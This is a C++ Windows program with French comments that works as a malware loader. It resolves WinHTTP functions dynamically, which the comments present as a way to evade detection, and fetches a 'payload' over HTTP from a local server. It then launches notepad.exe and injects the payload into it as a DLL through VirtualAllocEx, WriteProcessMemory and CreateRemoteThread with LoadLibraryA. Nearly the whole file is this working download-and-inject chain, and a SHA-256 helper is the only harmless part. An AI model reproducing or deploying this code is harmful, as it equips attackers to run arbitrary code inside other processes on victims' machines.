#include <iostream>
#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>


// Définition de la fonction LoadLibrary en utilisant D/Invoke
typedef HMODULE(WINAPI* LoadLibraryFn)(LPCSTR lpLibFileName);
//typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef HINTERNET(NTAPI* _WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef HINTERNET(NTAPI* _WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR ppwszAcceptTypes, DWORD dwFlags);
typedef HINTERNET(WINAPI* WINHTTPOPEN)(LPCWSTR pwszUserAgent, DWORD dwAccessType, LPCWSTR pwszProxyName, LPCWSTR pwszProxyBypass, DWORD dwFlags);
typedef HINTERNET(WINAPI* WINHTTPCONNECT)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef HINTERNET(WINAPI* WINHTTPOPENREQUEST)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags);
typedef BOOL(NTAPI _WinHttpCloseHandle)(HINTERNET hInternet);
typedef HINTERNET(NTAPI* _WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
typedef BOOL(NTAPI* _WinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL(NTAPI* _WinHttpQueryDataAvailable)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
typedef BOOL(NTAPI* _WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
typedef BOOL(NTAPI* _WinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
typedef UINT(CALLBACK* fnMessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* _NtProtectVirtualMemory)(HANDLE, PVOID, PULONG, ULONG, PULONG);


// Fonction pour calculer le hachage SHA-256 d'une chaîne de texte
bool CalculateSHA256Hash(const char* input, DWORD inputSize, BYTE* hashBuffer) {
    HCRYPTPROV hProv = NULL;
    HCRYPTHASH hHash = NULL;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        std::cerr << "Impossible d'acquérir le contexte de chiffrement." << std::endl;
        return false;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        std::cerr << "Impossible de créer le hachage." << std::endl;
        CryptReleaseContext(hProv, 0);
        return false;
    }

    if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(input), inputSize, 0)) {
        std::cerr << "Impossible de mettre en hachage les données." << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    DWORD hashSize = 32; // SHA-256 produit un hachage de 32 octets (256 bits)
    if (!CryptGetHashParam(hHash, HP_HASHVAL, hashBuffer, &hashSize, 0)) {
        std::cerr << "Impossible d'obtenir le hachage." << std::endl;
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return false;
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return true;
}


int Hash(const char* inputData) {
    DWORD inputSize = strlen(inputData);
    BYTE hashBuffer[32]; // Pour stocker le résultat du hachage SHA-256

    if (CalculateSHA256Hash(inputData, inputSize, hashBuffer)) {
        std::cout << "Hachage SHA-256 de '" << inputData << "': ";
        for (int i = 0; i < 32; i++) {
            printf("%02x", hashBuffer[i]);
        }
        std::cout << std::endl;
    }
    else {
        std::cerr << "Erreur lors du calcul du hachage." << std::endl;
        return 1;
    }
}


int main() {

    //HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    //HMODULE winhttp = GetModuleHandleA("winhttp.dll");
    HMODULE winhttp = LoadLibraryA("winhttp.dll");

    _WinHttpOpen WinHttpOpen = (_WinHttpOpen)GetProcAddress(winhttp, "WinHttpOpen");
    _WinHttpConnect WinHttpConnect = (_WinHttpConnect)GetProcAddress(winhttp, "WinHttpConnect");
    _WinHttpOpenRequest WinHttpOpenRequest = (_WinHttpOpenRequest)GetProcAddress(winhttp, "WinHttpOpenRequest");
    _WinHttpReadData WinHttpReadData = (_WinHttpReadData)GetProcAddress(winhttp, "WinHttpReadData");
    _WinHttpReceiveResponse WinHttpReceiveResponse = (_WinHttpReceiveResponse)GetProcAddress(winhttp, "WinHttpReceiveResponse");
    _WinHttpSendRequest WinHttpSendRequest = (_WinHttpSendRequest)GetProcAddress(winhttp, "WinHttpSendRequest");


    // Nom de la DLL que vous souhaitez charger
    LPCSTR dllName = "kernel32.dll";

    // Charger la bibliothèque kernel32.dll
    HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
    if (!kernel32) {
        std::cerr << "Impossible de charger kernel32.dll" << std::endl;
        return 1;
    }

    // Récupérer l'adresse de la fonction LoadLibraryA depuis kernel32.dll
    LoadLibraryFn loadLibrary = reinterpret_cast<LoadLibraryFn>(GetProcAddress(kernel32, "LoadLibraryA"));
    if (!loadLibrary) {
        std::cerr << "Impossible de récupérer l'adresse de LoadLibraryA" << std::endl;
        return 1;
    }

    // Charger la DLL
    HMODULE loadedDll = loadLibrary(dllName);
    if (!loadedDll) {
        std::cerr << "Impossible de charger la DLL : " << dllName << std::endl;
        return 1;
    }

    std::cout << "DLL chargée avec succès." << std::endl;

    // Vous pouvez maintenant appeler les fonctions exportées depuis la DLL chargée.

    // Libérer la DLL (optionnel, selon vos besoins)
    FreeLibrary(loadedDll);

    // Hashage de la variable inputData
    const char* inputData = "Hello World!";
    Hash(inputData);

    // Récupération du Payload
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", 0, NULL, NULL, 0);
    
    if(!hSession)
        printf("Error %d has occurred.\n", GetLastError());
    
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, L"127.0.0.1", 8888, 0);

    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/download", NULL, NULL, NULL, NULL);

    // Envoyer la demande HTTP.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
        
    // Attendre la réponse du serveur.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Lire les données du fichier téléchargé.
    std::string downloadedContent; // Variable pour stocker le contenu téléchargé

    if (bResults) {
        char buffer[1024];
        DWORD bytesRead = 0;

        do {
            if (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                if (bytesRead > 0) {
                    // Ajouter les données téléchargées à la variable
                    downloadedContent.append(buffer, bytesRead);
                }
            }
            else {
                // Gérer les erreurs de lecture
                printf("Erreur lors de la lecture des données.\n");
                break;
            }
        } while (bytesRead > 0);

        std::cout << "Contenu téléchargé : " << downloadedContent << std::endl;

        //// Hashage de la variable downloadedContent
        const char* downloadedContentHash = downloadedContent.c_str();
        //Hash(downloadedContentHash);


        // Exécution de la Payload

        // Chemin vers le processus cible (à remplacer par le chemin de votre choix)
        const char* targetProcessPath = "C:\\Windows\\System32\\notepad.exe";

        // Charge utile (à remplacer par le chemin de votre propre charge utile)
        const char* payloadPath = downloadedContentHash;

        // Lancer le processus cible
        STARTUPINFOA startupInfo = { sizeof(STARTUPINFOA) };
        PROCESS_INFORMATION processInfo;
        if (!CreateProcessA(targetProcessPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo)) {
            std::cerr << "Impossible de lancer le processus cible." << std::endl;
            return 1;
        }

        // Attendre que le processus cible soit prêt (vous pouvez ajuster cette attente selon vos besoins)
        Sleep(2000); // Attendre 2 secondes (par exemple)

        // Ouvrir le processus cible
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);
        if (!hProcess) {
            std::cerr << "Impossible d'ouvrir le processus cible." << std::endl;
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            return 1;
        }

        // Charger votre charge utile dans le processus cible
        LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMemory) {
            std::cerr << "Impossible d'allouer de la mémoire dans le processus cible." << std::endl;
            CloseHandle(hProcess);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            return 1;
        }

        if (!WriteProcessMemory(hProcess, remoteMemory, payloadPath, strlen(payloadPath) + 1, NULL)) {
            std::cerr << "Impossible d'écrire le chemin de la charge utile dans le processus cible." << std::endl;
            VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            return 1;
        }

        // Créer un thread distant pour exécuter la charge utile
        HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, remoteMemory, 0, NULL);
        if (!hRemoteThread) {
            std::cerr << "Impossible de créer un thread distant." << std::endl;
            VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            return 1;
        }

        // Attendre que le thread distant se termine
        WaitForSingleObject(hRemoteThread, INFINITE);

        // Nettoyer les ressources
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hRemoteThread);
        CloseHandle(hProcess);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);

        std::cout << "Charge utile exécutée avec succès dans le processus cible." << std::endl;

    }



    return 0;
}